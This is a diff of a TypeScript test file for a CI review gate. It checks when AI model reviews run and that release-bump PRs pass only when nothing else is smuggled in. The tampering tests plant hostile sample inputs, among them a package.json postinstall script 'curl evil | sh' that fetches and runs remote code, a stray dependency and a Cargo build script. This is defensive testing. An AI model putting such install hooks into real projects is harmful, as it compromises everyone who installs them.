+      ctx: ctx(), headTree: gateTree, prDiff: async () => diff, changedFiles: tier2Files,
       cacheFor: () => cache, requested: false, republishOnly: true, reviewSet: generalOnly, log: () => {},
     })
     expect(outcome.kind).toBe('cache-hit')
@@ -2349,11 +2508,11 @@ describe('rail: decideReviewGate enforces the four fleet/review branches (cache-
 
   it('a push with an unchanged diff republishes a cached FAIL too — republishing is not synthesising a green', async () => {
     const cache = fakeCache({
-      key: { pr: '42', diffHash: diffHash(diff) },
+      key: { pr: '42', diffHash: diffHash(diff), headTree: TREE },
       verdict: { verdict: 'FAIL', text: 'VERDICT: FAIL — unsafe unwrap' },
     })
     const outcome = await decideReviewGate({
-      ctx: ctx(), prDiff: async () => diff, changedFiles: tier2Files,
+      ctx: ctx(), headTree: gateTree, prDiff: async () => diff, changedFiles: tier2Files,
       cacheFor: () => cache, requested: false, republishOnly: true, reviewSet: generalOnly, log: () => {},
     })
     expect(outcome.kind).toBe('cache-hit')
@@ -2361,34 +2520,34 @@ describe('rail: decideReviewGate enforces the four fleet/review branches (cache-
     expect(outcome.verdict.verdict).toBe('FAIL')
   })
 
-  // The load-bearing one. A push that CHANGED the diff has nothing cached,
+  // The load-bearing one. A push that CHANGED the tree has nothing cached,
   // and must never spend a model call — no matter what `requested` says.
   // Without the `republishOnly` guard in the gate this returns
-  // `run-engine`, which is one model review per push on every open PR. It
-  // is not red on its own account either (#1394): the PR's last earned
-  // verdict is carried forward, and a PR nobody asked about is green.
-  const earned = { verdict: 'PASS' as const, headSha: 'earned9', runUrl: 'https://example/run/9', text: 'VERDICT: PASS (carried)' }
+  // `run-engine`, which is one model review per push on every open PR. Nor
+  // may it conclude green (#2014): a FAIL is carried forward, and a PASS —
+  // earned on another tree — is `tree-changed`, a no-verdict red.
+  const earned = { verdict: 'PASS' as const, headSha: 'earned9', runUrl: 'https://example/run/9', text: 'VERDICT: PASS (earlier tree)' }
   for (const [label, last, kind] of [
-    ['a PASS was earned', { kind: 'found', earned }, 'carried'],
+    ['a PASS was earned', { kind: 'found', earned }, 'tree-changed'],
     ['a FAIL was earned', { kind: 'found', earned: { ...earned, verdict: 'FAIL' } }, 'carried'],
     ['nothing was ever earned', { kind: 'none', runsSearched: 3 }, 'unreviewed'],
     ['the history is unreadable', { kind: 'unreadable', reason: 'api down' }, 'carry-unreadable'],
   ] as const) {
-    it(`a push that changed the diff never reaches run-engine, even when requested is true — ${label}`, async () => {
+    it(`a push that changed the tree never reaches run-engine, even when requested is true — ${label}`, async () => {
       const cache = fakeCache()
       const outcome = await decideReviewGate({
-        ctx: ctx(), prDiff: async () => diff, changedFiles: tier2Files,
+        ctx: ctx(), headTree: gateTree, prDiff: async () => diff, changedFiles: tier2Files,
         cacheFor: () => cache, requested: true, republishOnly: true, reviewSet: generalOnly, log: () => {},
         lastVerdict: async () => last,
       })
       expect(outcome.kind).toBe(kind)
-      if (outcome.kind === 'carried' && last.kind === 'found') expect(outcome.earned).toEqual(last.earned)
+      if ((outcome.kind === 'carried' || outcome.kind === 'tree-changed') && last.kind === 'found') expect(outcome.earned).toEqual(last.earned)
     })
   }
 
   it('a push with no last-verdict lookup wired fails closed — never "nothing was earned", which is green', async () => {
     const outcome = await decideReviewGate({
-      ctx: ctx(), prDiff: async () => diff, changedFiles: tier2Files,
+      ctx: ctx(), headTree: gateTree, prDiff: async () => diff, changedFiles: tier2Files,
       cacheFor: () => fakeCache(), requested: true, republishOnly: true, reviewSet: generalOnly, log: () => {},
     })
     expect(outcome.kind).toBe('carry-unreadable')
@@ -2397,7 +2556,7 @@ describe('rail: decideReviewGate enforces the four fleet/review branches (cache-
   it('a review request never pays for the last-verdict lookup', async () => {
     let asked = 0
     const outcome = await decideReviewGate({
-      ctx: ctx(), prDiff: async () => diff, changedFiles: tier2Files,
+      ctx: ctx(), headTree: gateTree, prDiff: async () => diff, changedFiles: tier2Files,
       cacheFor: () => fakeCache(), requested: true, republishOnly: false, reviewSet: generalOnly, log: () => {},
       lastVerdict: async () => { asked += 1; return { kind: 'none', runsSearched: 0 } },
     })
@@ -2414,7 +2573,7 @@ describe('rail: decideReviewGate enforces the four fleet/review branches (cache-
       ok: true, profiles: ['crypto-security-reviewer'], fromLabels: ['crypto-security-reviewer'], reasons: ['label'],
     })
     const outcome = await decideReviewGate({
-      ctx: ctx(), prDiff: async () => diff, changedFiles: tier2Files,
+      ctx: ctx(), headTree: gateTree, prDiff: async () => diff, changedFiles: tier2Files,
       cacheFor: () => cache, requested: true, republishOnly: true, reviewSet: withProfile, log: () => {},
       lastVerdict: async () => ({ kind: 'none', runsSearched: 0 }),
     })
@@ -2427,7 +2586,7 @@ describe('rail: decideReviewGate enforces the four fleet/review branches (cache-
   it('a docs-only push still concludes low-tier, ahead of the carry', async () => {
     const cache = fakeCache()
     const outcome = await decideReviewGate({
-      ctx: ctx(), prDiff: async () => diff, changedFiles: async () => ['docs/epics/EP01-foo.md'],
+      ctx: ctx(), headTree: gateTree, prDiff: async () => diff, changedFiles: async () => ['docs/epics/EP01-foo.md'],
       cacheFor: () => cache, requested: false, republishOnly: true, reviewSet: generalOnly, log: () => {},
     })
     expect(outcome.kind).toBe('low-tier')
@@ -2440,7 +2599,7 @@ describe('rail: decideReviewGate enforces the four fleet/review branches (cache-
   it('a Dependabot force-push still takes the bot-authored short-circuit', async () => {
     const cache = fakeCache()
     const outcome = await decideReviewGate({
-      ctx: ctx(), prDiff: async () => diff, changedFiles: tier2Files,
+      ctx: ctx(), headTree: gateTree, prDiff: async () => diff, changedFiles: tier2Files,
       cacheFor: () => cache, requested: false, republishOnly: true, prAuthor: 'dependabot[bot]',
       reviewSet: generalOnly, log: () => {},
     })
@@ -2453,16 +2612,239 @@ describe('rail: decideReviewGate enforces the four fleet/review branches (cache-
   // republished green either.
   it('a push with an unresolvable review set still concludes review-set-unresolved', async () => {
     const cache = fakeCache({
-      key: { pr: '42', diffHash: diffHash(diff) },
+      key: { pr: '42', diffHash: diffHash(diff), headTree: TREE },
       verdict: { verdict: 'PASS', text: 'VERDICT: PASS (cached)' },
     })
     const outcome = await decideReviewGate({
-      ctx: ctx(), prDiff: async () => diff, changedFiles: tier2Files, cacheFor: () => cache,
+      ctx: ctx(), headTree: gateTree, prDiff: async () => diff, changedFiles: tier2Files, cacheFor: () => cache,
       requested: false, republishOnly: true,
       reviewSet: async () => ({ ok: false, reason: 'labels unreadable' }),
       log: () => {},
     })
     expect(outcome.kind).toBe('review-set-unresolved')
+  })
+})
+
+/**
+ * Rail for the knope release PR (#1944): it concludes a REAL green with no
+ * review, and nothing else can reach that green.
+ *
+ * #1944 sat on `fleet/review: FAILED — this head's tree (836170ff…) has no
+ * verdict: the last PASS was earned on fa241912…, a different tree`
+ * (`tree-changed`, run 39943449486): knope force-pushes `release` onto a new
+ * tree on every merge to main, a push never starts a review, and a PASS for
+ * another tree covers nothing (#2014). The operator's ruling is that release
+ * PRs need no review; the gate says so as `release-pr`, keyed on STRUCTURE.
+ *
+ * Both directions are asserted, and the second is the one that matters: a
+ * match that was too broad would hand every PR a free pass. The diffs are
+ * produced by REAL `git diff` (with the gate's own `CI_DIFF_FLAGS`) over the
+ * repo's real version files and real `knope.toml` — not a hand-typed
+ * fixture that could drift from what knope actually writes.
+ */
+describe('rail: the knope release PR concludes green without a review, and nothing else can (#1944)', () => {
+  const TREE = 'a3655875dd861eb24ebf01708a07f4caa0995b43'
+  const gateTree = async (): Promise<string> => TREE
+  const noCache: ReviewCache = { async lookup() { return undefined }, async record() {} }
+  const KNOPE_TOML = readFileSync(join(process.cwd(), 'knope.toml'), 'utf8')
+
+  const sh = (cwd: string, ...args: string[]): string =>
+    execFileSync('git', ['-C', cwd, '-c', 'user.name=t', '-c', 'user.email=t@t', '-c', 'commit.gpgsign=false', ...args], { encoding: 'utf8' })
+
+  const VERSIONED = knopeVersionedPaths(KNOPE_TOML)
+  const CURRENT = (JSON.parse(readFileSync(join(process.cwd(), 'package.json'), 'utf8')) as { version: string }).version
+  const NEXT = CURRENT.replace(/\d+$/, (n) => String(Number(n) + 1))
+
+  /** Real repo, real version files, real diff: base commit, then `mutate`. */
+  function realDiff(mutate: (dir: string) => void): { diff: string; files: string[] } {
+    const dir = mkdtempSync(join(tmpdir(), 'release-pr-rail-'))
+    try {
+      sh(dir, 'init', '-q', '-b', 'main')
+      const base = ['CHANGELOG.md', ...VERSIONED]
+      for (const p of base) {
+        const dest = join(dir, p)
+        execFileSync('mkdir', ['-p', dirname(dest)])
+        writeFileSync(dest, readFileSync(join(process.cwd(), p)))
+      }
+      sh(dir, 'add', '-A'); sh(dir, 'commit', '-q', '-m', 'base')
+      mutate(dir)
+      sh(dir, 'add', '-A'); sh(dir, 'commit', '-q', '-m', 'head')
+      const flags = [...CI_DIFF_FLAGS]
+      return {
+        diff: sh(dir, 'diff', ...flags, 'HEAD~1...HEAD'),
+        files: sh(dir, 'diff', '--name-only', 'HEAD~1...HEAD').split('\n').filter((l) => l.length > 0),
+      }
+    } finally { rmSync(dir, { recursive: true, force: true }) }
+  }
+
+  /** What `knope prepare-release` does: swap the version in each versioned file, prepend a changelog section. */
+  function knopeBump(dir: string, skip: readonly string[] = []): void {
+    for (const p of VERSIONED) {
+      if (skip.includes(p)) continue
+      const f = join(dir, p)
+      writeFileSync(f, readFileSync(f, 'utf8').replaceAll(`"${CURRENT}"`, `"${NEXT}"`).replaceAll(`>${CURRENT}<`, `>${NEXT}<`))
+    }
+    const log = join(dir, 'CHANGELOG.md')
+    writeFileSync(log, `# Changelog\n\n## ${NEXT} (2026-10-23)\n\n### Fixes\n\n- something crypto-ish\n\n${readFileSync(log, 'utf8').replace(/^# Changelog\n+/, '')}`)
+  }
+
+  const release = realDiff((d) => knopeBump(d))
+
+  const earnedPass = { kind: 'found' as const, earned: { verdict: 'PASS' as const, headSha: 'fa24191', runUrl: 'https://example/run/1', text: 'VERDICT: PASS (earlier tree)' } }
+
+  const gate = (o: {
+    branch?: string; diff?: string; files?: string[]; republishOnly?: boolean; requested?: boolean
+    fromLabels?: string[]; profiles?: string[]; knopeConfig?: (() => Promise<string>) | null; prAuthor?: string
+  } = {}) => decideReviewGate({
+    ctx: { branch: o.branch ?? 'release', repoDir: '/base', headDir: '/tmp/head', baseSha: 'b', headSha: 'h', pr: '1944' },
+    headTree: gateTree, prDiff: async () => o.diff ?? release.diff, changedFiles: async () => o.files ?? release.files,
+    cacheFor: () => noCache, requested: o.requested ?? false, republishOnly: o.republishOnly ?? true,
+    lastVerdict: async () => earnedPass,
+    ...(o.prAuthor === undefined ? {} : { prAuthor: o.prAuthor }),
+    ...(o.knopeConfig === null ? {} : { knopeConfig: o.knopeConfig ?? (async () => KNOPE_TOML) }),
+    reviewSet: async () => ({ ok: true, profiles: o.profiles ?? [], fromLabels: o.fromLabels ?? [], reasons: [] }),
+    log: () => {},
+  })
+
+  it('reads the versioned files from knope.toml: all of them exist, and package.json comes first', () => {
+    expect(VERSIONED[0]).toBe('package.json')
+    expect(VERSIONED.length).toBeGreaterThanOrEqual(7)
+    for (const p of VERSIONED) expect(existsSync(join(process.cwd(), p)), p).toBe(true)
+    expect(knopeChangelogPath(KNOPE_TOML)).toBe('CHANGELOG.md')
+  })
+
+  // ── (a) a release PR goes green ───────────────────────────────────────
+  it('(a) knope\'s real release diff concludes release-pr on the PUSH that used to be tree-changed red', async () => {
+    // Pre-fix this exact input — a push over a new tree, with a PASS earned on
+    // another — was `tree-changed`: the #1944 failure. Asserted both ways below.
+    const o = await gate({ republishOnly: true })
+    expect(o.kind).toBe('release-pr')
+    if (o.kind !== 'release-pr') throw new Error('unreachable')
+    expect([o.from, o.to]).toEqual([CURRENT, NEXT])
+    expect(REVIEW_GATE_STANDING['release-pr']).toBe('no-review-needed')
+    expect(reviewGateFailsClosed('release-pr')).toBe(false)
+  })
+
+  it('(a) is the same on a requested review — the operator\'s ruling is no review at all, not a review on demand', async () => {
+    expect((await gate({ republishOnly: false, requested: true })).kind).toBe('release-pr')
+  })
+
+  it('(a) the changelog prose pulling the crypto reviewer into the set is noise for a version-only diff', async () => {
+    expect((await gate({ profiles: ['crypto-security-reviewer'] })).kind).toBe('release-pr')
+  })
+
+  // ── (b) nothing else can reach that green ─────────────────────────────
+  it('(b) the IDENTICAL diff on any other branch is not a release PR — the pre-fix red, unchanged', async () => {
+    for (const branch of ['fleet/shared/1', 'feat/release', 'releases', 'release-0.19.20', 'main']) {
+      expect((await gate({ branch })).kind, branch).toBe('tree-changed')
+    }
+    expect((await gate({ branch: 'fleet/shared/1', republishOnly: false, requested: false })).kind).toBe('not-requested')
+  })
+
+  it('(b) a PR author cannot make it release-pr either way: the branch + shape decide, not who opened it', async () => {
+    expect((await gate({ branch: 'fleet/shared/1', prAuthor: 'llamenos-auto' })).kind).toBe('tree-changed')
+  })
+
+  it('(b) a branch named "release" carrying ANY other change is refused', async () => {
+    const tampered: Array<[string, (d: string) => void]> = [
+      ['a code file alongside the bump', (d) => { knopeBump(d); execFileSync('mkdir', ['-p', join(d, 'apps/worker')]); writeFileSync(join(d, 'apps/worker/evil.ts'), 'export const x = 1\n') }],
+      ['a workflow alongside the bump', (d) => { knopeBump(d); execFileSync('mkdir', ['-p', join(d, '.github/workflows')]); writeFileSync(join(d, '.github/workflows/x.yml'), 'on: push\n') }],
+      ['a dependency added in package.json', (d) => {
+        knopeBump(d)
+        const f = join(d, 'package.json')
+        writeFileSync(f, readFileSync(f, 'utf8').replace('"dependencies": {', '"dependencies": {\n    "evil-pkg": "1.0.0",'))
+      }],
+      ['a script changed in package.json', (d) => {
+        knopeBump(d)
+        const f = join(d, 'package.json')
+        writeFileSync(f, readFileSync(f, 'utf8').replace('"scripts": {', '"scripts": {\n    "postinstall": "curl evil | sh",'))
+      }],
+      ['a non-version line changed in Cargo.toml', (d) => {
+        knopeBump(d)
+        const f = join(d, 'apps/desktop/Cargo.toml')
+        writeFileSync(f, readFileSync(f, 'utf8').replace('[package]', '[package]\nbuild = "evil.rs"'))
+      }],
+      ['a downgrade', (d) => {
+        for (const p of VERSIONED) {
+          const f = join(d, p)
+          writeFileSync(f, readFileSync(f, 'utf8').replaceAll(`"${CURRENT}"`, '"0.0.1"').replaceAll(`>${CURRENT}<`, '>0.0.1<'))
+        }
+      }],
+      ['a versioned file bumped to a DIFFERENT version', (d) => {
+        knopeBump(d)
+        const f = join(d, 'deploy/helm/llamenos/Chart.yaml')
+        writeFileSync(f, readFileSync(f, 'utf8').replace(`"${NEXT}"`, '"9.9.9"'))
+      }],
+      ['the changelog loses a line', (d) => { knopeBump(d); const f = join(d, 'CHANGELOG.md'); writeFileSync(f, readFileSync(f, 'utf8').split('\n').slice(0, -3).join('\n')) }],
+      ['a versioned file deleted', (d) => { knopeBump(d); rmSync(join(d, 'deploy/helm/llamenos/Chart.yaml')) }],
+    ]
+    for (const [label, mutate] of tampered) {
+      const bad = realDiff(mutate)
+      expect((await gate({ diff: bad.diff, files: bad.files })).kind, label).toBe('tree-changed')
+    }
+    // A changelog-only edit has no version bump, so it is not a release diff —
+    // it is a docs change, which the ordinary gate already concludes green on
+    // its own terms (`low-tier`). The point is the name: never `release-pr`.
+    const docsOnly = realDiff((d) => writeFileSync(join(d, 'CHANGELOG.md'), `new line\n${readFileSync(join(d, 'CHANGELOG.md'), 'utf8')}`))
+    expect((await gate({ diff: docsOnly.diff, files: docsOnly.files })).kind).toBe('low-tier')
+  })
+
+  it('(b) a dependency line that merely carries the old version string cannot ride along a version swap', () => {
+    const hunk = (path: string, pairs: Array<[string, string]>): string =>
+      `diff --git a/${path} b/${path}\nindex ${'1'.repeat(40)}..${'2'.repeat(40)} 100644\n--- a/${path}\n+++ b/${path}\n@@ -1,9 +1,9 @@\n` +
+      pairs.map(([a, b]) => `-${a}\n+${b}`).join('\n') + '\n'
+    const files = ['package.json', 'apps/desktop/Cargo.toml']
+    const pkg = hunk('package.json', [[`  "version": "${CURRENT}",`, `  "version": "${NEXT}",`]])
+    const ok = pkg + hunk('apps/desktop/Cargo.toml', [[`version = "${CURRENT}"`, `version = "${NEXT}"`]])
+    expect(releasePrShape({ branch: 'release', diff: ok, changedFiles: files, knopeToml: KNOPE_TOML }).ok).toBe(true)
+    const smuggled = pkg + hunk('apps/desktop/Cargo.toml', [
+      [`version = "${CURRENT}"`, `version = "${NEXT}"`],
+      [`evil = { version = "${CURRENT}" }`, `evil = { version = "${NEXT}" }`],
+    ])
+    const r = releasePrShape({ branch: 'release', diff: smuggled, changedFiles: files, knopeToml: KNOPE_TOML })
+    expect(r.ok).toBe(false)
+    const dep = pkg + hunk('apps/desktop/Cargo.toml', [[`evil = { version = "${CURRENT}" }`, `evil = { version = "${NEXT}" }`]])
+    expect(releasePrShape({ branch: 'release', diff: dep, changedFiles: files, knopeToml: KNOPE_TOML }).ok).toBe(false)
+  })
+
+  it('(b) a diff that is the release diff PLUS a smuggled file is refused even when the changed-file list lies', async () => {
+    const bad = realDiff((d) => { knopeBump(d); writeFileSync(join(d, 'evil.sh'), 'x\n') })
+    expect((await gate({ diff: bad.diff, files: release.files })).kind).toBe('tree-changed')
+    expect((await gate({ diff: release.diff, files: [...release.files, 'evil.sh'] })).kind).toBe('tree-changed')
+  })
+
+  it('(b) a label is a deliberate request for a reviewer and outranks the release path', async () => {
+    const o = await gate({ fromLabels: ['crypto-security-reviewer'], profiles: ['crypto-security-reviewer'] })
+    expect(o.kind).toBe('tree-changed')
+  })
+
+  it('(b) fails toward the ordinary gate when knope.toml is unreadable, absent, or lists nothing', async () => {
+    expect((await gate({ knopeConfig: null })).kind).toBe('tree-changed')
+    expect((await gate({ knopeConfig: async () => { throw new Error('ENOENT') } })).kind).toBe('tree-changed')
+    expect((await gate({ knopeConfig: async () => '[package]\nchangelog = "CHANGELOG.md"\n' })).kind).toBe('tree-changed')
+    expect((await gate({ knopeConfig: async () => 'versioned_files = [\n  "package.json",\n' })).kind).toBe('tree-changed')
+  })
+
+  it('(b) an unresolvable review set still fails closed AHEAD of the release path (invariant 4)', async () => {
+    const o = await decideReviewGate({
+      ctx: { branch: 'release', repoDir: '/base', headDir: '/tmp/head', baseSha: 'b', headSha: 'h', pr: '1944' },
+      headTree: gateTree, prDiff: async () => release.diff, changedFiles: async () => release.files,
+      cacheFor: () => noCache, requested: false, republishOnly: true, knopeConfig: async () => KNOPE_TOML,
+      reviewSet: async () => ({ ok: false, reason: 'labels unreadable' }), log: () => {},
+    })
+    expect(o.kind).toBe('review-set-unresolved')
+  })
+
+  // ── the wiring that makes (a) a CHECK conclusion, not just a return value ──
+  it('the gate step is wired to the base knope.toml, and the naming step gives release-pr its own PASS name', () => {
+    const cli = readFileSync(join(process.cwd(), 'orchestrator/src/cli.ts'), 'utf8')
+    expect(cli).toMatch(/knopeConfig:\s*async\s*\(\)\s*=>\s*readFileSync\(join\(REPO_ROOT, 'knope\.toml'\)/)
+    const wf = readFileSync(join(process.cwd(), '.github/workflows/fleet-review.yml'), 'utf8')
+    expect(wf).toContain('release-pr) token="PASS:release-pr" ;;')
+    expect(wf).toContain('PASS:release-pr) detail=')
+    // The no-job-level-`if:` invariant (#844/#848) is pinned elsewhere; this
+    // is the release path's half: it is a step OUTCOME, never a skip.
+    expect(wf).not.toMatch(/^  fleet-review:\n(?:    [^\n]*\n)*?    if:/m)
   })
 })
 
@@ -2763,8 +3145,8 @@ describe("rail: a PR's changes decide which ci.yml platform jobs run (#664)", ()
 
   const ALL_GATED_JOBS = [
     'ios-build-test', 'android-build-test', 'android-e2e', 'desktop-unit',
-    'e2e', 'backend-bdd', 'backend-unit', 'crypto-tests', 'migration-drift',
-    'ansible-validate', 'audit',
+    'e2e', 'backend-bdd', 'backend-integration', 'backend-unit', 'crypto-tests',
+    'migration-drift', 'ansible-validate', 'audit',
   ]
 
   it.each([
@@ -2775,15 +3157,31 @@ describe("rail: a PR's changes decide which ci.yml platform jobs run (#664)", ()
       ALL_GATED_JOBS,
     ],
     [
+      // `crypto-tests` RUNS here: packages/crypto/tests/envelope_aad_cross_platform.rs
+      // reads apps/ios/Sources and apps/android/app/src/main, so a mobile-only
+      // diff that drifts from the registry is exactly what it exists to catch.
+      // It used to be listed as skipped, which pinned the #1941 gap in place.
       'an apps/ios/-only change',
       ['apps/ios/Sources/App/Foo.swift'],
-      ['ios-build-test'],
-      ALL_GATED_JOBS.filter((j) => j !== 'ios-build-test'),
+      ['ios-build-test', 'crypto-tests'],
+      ALL_GATED_JOBS.filter((j) => j !== 'ios-build-test' && j !== 'crypto-tests'),
+    ],
+    [
+      'an apps/android/-only change (CryptoService.kt label-id table)',
+      ['apps/android/app/src/main/java/org/llamenos/hotline/crypto/CryptoService.kt'],
+      ['android-build-test', 'crypto-tests'],
+      ['ios-build-test', 'audit'],
+    ],
+    [
+      'a src/client/-only change (hub-key-manager.ts is read by the AAD cross-platform test)',
+      ['src/client/lib/hub-key-manager.ts'],
+      ['crypto-tests'],
+      ['ios-build-test', 'android-build-test', 'android-e2e', 'audit'],
     ],
     [
       'a packages/protocol/-only change',
       ['packages/protocol/schemas/foo.ts'],
-      ['ios-build-test', 'android-build-test', 'android-e2e', 'desktop-unit', 'e2e', 'backend-bdd', 'backend-unit', 'crypto-tests'],
+      ['ios-build-test', 'android-build-test', 'android-e2e', 'desktop-unit', 'e2e', 'backend-bdd', 'backend-integration', 'backend-unit', 'crypto-tests'],
       // `audit` stays scoped to dependency manifests even on a shared-dep
       // change that runs everything else — this PR touched neither
       // package.json nor bun.lock and must not be blocked by a pre-existing
@@ -2806,7 +3204,7 @@ describe("rail: a PR's changes decide which ci.yml platform jobs run (#664)", ()
       // above, for the pair that pins both directions.
       'a packages/test-specs/-only change, outside the mobile corpus',
       ['packages/test-specs/features/security/foo.feature'],
-      ['desktop-unit', 'e2e', 'backend-bdd', 'backend-unit', 'migration-drift', 'ansible-validate'],
+      ['desktop-unit', 'e2e', 'backend-bdd', 'backend-integration', 'backend-unit', 'migration-drift', 'ansible-validate'],
       // `ios-build-test` and `crypto-tests` correctly skip — iOS doesn't
       // consume packages/test-specs/ yet (ios-e2e.yml stays dispatch-only
       // pending #661) and this touches no Rust. `audit` stays scoped to
@@ -2823,7 +3221,7 @@ describe("rail: a PR's changes decide which ci.yml platform jobs run (#664)", ()
       // row fail, so the narrowing cannot be over-applied either.
       'a packages/test-specs/ change INSIDE the mobile corpus',
       ['packages/test-specs/features/platform/mobile/hubs/hub-self-service.feature'],
-      ['android-build-test', 'android-e2e', 'desktop-unit', 'e2e', 'backend-bdd', 'backend-unit', 'migration-drift', 'ansible-validate'],
+      ['android-build-test', 'android-e2e', 'desktop-unit', 'e2e', 'backend-bdd', 'backend-integration', 'backend-unit', 'migration-drift', 'ansible-validate'],
       ['ios-build-test', 'crypto-tests', 'audit'],
     ],
     [
@@ -2872,6 +3270,12 @@ describe("rail: a PR's changes decide which ci.yml platform jobs run (#664)", ()
     ['backend-bdd', "needs.changes.outputs.revalidate == 'true' && needs.changes.outputs.backend == 'true'"],
     ['e2e', "needs.changes.outputs.revalidate == 'true' && (needs.changes.outputs.desktop == 'true' || needs.changes.outputs.backend == 'true')"],
     ['backend-unit', "needs.changes.outputs.backend == 'true' || needs.changes.outputs.orchestrator == 'true'"],
+    // Deliberately NOT revalidate-gated, unlike backend-bdd and e2e: one
+    // postgres service container on a hosted runner, contending for nothing
+    // scarce, covering server boot and client-visible response shapes. Adding
+    // `revalidate` here moves that signal out of the PR and into the serial
+    // merge queue — fail this test rather than let that happen quietly (#1167).
+    ['backend-integration', "needs.changes.outputs.backend == 'true'"],
     ['ansible-validate', "needs.changes.outputs.ansible == 'true' || needs.changes.outputs.backend == 'true'"],
     ['audit', "needs.changes.outputs.audit == 'true'"],
   ])('"%s" carries exactly the expected job-level if: — removing it must fail this test', (job, expected) => {
@@ -3233,15 +3637,58 @@ describe("rail: a PR's changes decide which ci.yml platform jobs run (#664)", ()
   // loads a vitest file.
   it('every vitest config a ci.yml job runs, and each of its setupFiles, runs that job when changed alone — and no iOS/Android/crypto job', () => {
     const yaml = ciYaml()
+    const pkgScripts: Record<string, string> =
+      JSON.parse(readFileSync(join(process.cwd(), 'package.json'), 'utf8')).scripts ?? {}
+
+    // A job need not spell `--config` out on the command line.
+    // `backend-integration` runs `bun scripts/test-worker-integration.ts`, which
+    // passes the config as separate argv entries so it can assert afterwards that
+    // the suite actually ran (#1167). So a job's configs are resolved from three
+    // places: the literal flag, any scripts/ file the job EXECUTES, and any
+    // `bun run <script>` resolved through package.json (which may itself name a
+    // scripts/ file). Without this the rail goes blind precisely when a job stops
+    // naming the flag inline.
+    const configsNamedIn = (text: string): string[] =>
+      [...stripComments(text).matchAll(/(vitest\.[a-z0-9-]+\.config\.ts)/g)].map((m) => m[1] as string)
+
+    const configsInScriptsNamedBy = (text: string): string[] => {
+      const out: string[] = []
+      for (const m of text.matchAll(/(scripts\/[A-Za-z0-9._/-]+\.(?:ts|sh))/g)) {
+        const file = join(process.cwd(), m[1] as string)
+        if (existsSync(file)) out.push(...configsNamedIn(readFileSync(file, 'utf8')))
+      }
+      return out
+    }
+
+    // Comment lines are stripped before matching, in the workflow AND in any
+    // script it runs. A comment that merely DESCRIBES the command
+    // ("# Runs `vitest run --config vitest.x.config.ts`") otherwise satisfies
+    // this rail on its own: replacing the real step with `run: echo skipped`
+    // left the pin green, which is the same class of false-green the rail
+    // exists to prevent.
+    const stripComments = (text: string): string =>
+      text.split('\n').filter((l) => !/^\s*#/.test(l)).join('\n')
+
     const bound: Array<[string, string]> = []
     for (const job of ALL_GATED_JOBS) {
-      for (const m of jobBlock(yaml, job).matchAll(/--config\s+(vitest\.[a-z0-9-]+\.config\.ts)/g)) bound.push([job, m[1] as string])
+      const block = stripComments(jobBlock(yaml, job))
+      const seen = new Set<string>()
+      for (const m of block.matchAll(/--config\s+(vitest\.[a-z0-9-]+\.config\.ts)/g)) seen.add(m[1] as string)
+      for (const c of configsInScriptsNamedBy(block)) seen.add(c)
+      for (const m of block.matchAll(/bun run ([A-Za-z0-9:_-]+)/g)) {
+        const cmd = pkgScripts[m[1] as string]
+        if (!cmd) continue
+        for (const c of configsNamedIn(cmd)) seen.add(c)
+        for (const c of configsInScriptsNamedBy(cmd)) seen.add(c)
+      }
+      for (const c of seen) bound.push([job, c])
     }
     // Pinned so a renamed job or a moved step cannot make the loop vacuous.
     expect(bound).toEqual(expect.arrayContaining([
       ['backend-unit', 'vitest.unit.config.ts'],
       ['backend-unit', 'vitest.orchestrator.config.ts'],
       ['desktop-unit', 'vitest.desktop.config.ts'],
+      ['backend-integration', 'vitest.integration.config.ts'],
     ]))
     for (const [job, config] of bound) {
       const setupList = readFileSync(join(process.cwd(), config), 'utf8').match(/setupFiles:\s*\[([^\]]*)\]/)?.[1] ?? ''
@@ -3267,6 +3714,18 @@ describe("rail: a PR's changes decide which ci.yml platform jobs run (#664)", ()
       }
     },
   )
+
+  // ci-status reads `skipped` as success, so crypto-tests vanishing from a diff
+  // that set the crypto flag would stay green. platform-suite-coverage is the
+  // job that turns that skip fatal (#1941, #1954) — but only if it can SEE the
+  // result, which needs both the `needs` edge and the check.
+  it('platform-suite-coverage needs crypto-tests and fails when it is skipped with the crypto flag set', () => {
+    const block = jobBlock(ciYaml(), 'platform-suite-coverage')
+    expect(block).toMatch(/needs:\s*\[[^\]]*\bcrypto-tests\b[^\]]*\]/)
+    expect(block).toContain('CRYPTO: ${{ needs.changes.outputs.crypto }}')
+    expect(block).toContain('R_CRYPTO: ${{ needs.crypto-tests.result }}')
+    expect(block).toContain('if [ "$CRYPTO" = "true" ] && [ "$R_CRYPTO" = "skipped" ]; then gap="$gap crypto-tests"; fi')
+  })
 
   it.each([['build'], ['test']])('desktop-e2e.yml "%s" carries exactly the desktop gate — removing it must fail this test', (job) => {
     expect(jobLevelIf(jobBlock(workflowText('desktop-e2e.yml'), job))).toBe("needs.changes.outputs.desktop == 'true'")
